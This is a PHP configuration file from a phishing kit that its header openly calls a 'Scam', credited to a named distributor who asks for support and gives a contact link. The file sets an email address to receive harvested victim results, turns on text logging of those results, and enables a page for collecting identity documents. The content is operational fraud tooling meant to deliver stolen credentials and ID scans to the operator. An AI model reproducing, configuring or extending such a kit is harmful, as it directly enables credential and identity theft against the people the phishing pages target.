<?php 
/*
 * This Scam is Cleaned And Updated By G33K.OFFICIEL
 * Contact Me : www.fb.com/G33K.OFFICIEL
 * Please don't forget to support us for more tools
 */
//PRIV8 SCAM G33K.OFFICIEL V4 
$rezult_mail="johntiger1337@yandex.com";                          //<<<<<<<<=========******Your Email***********
$txt = 1; // 1 for text rezult, 0 for no text rezult
$id = 1; // 1 For ID Page, 0 for no ID Page

?>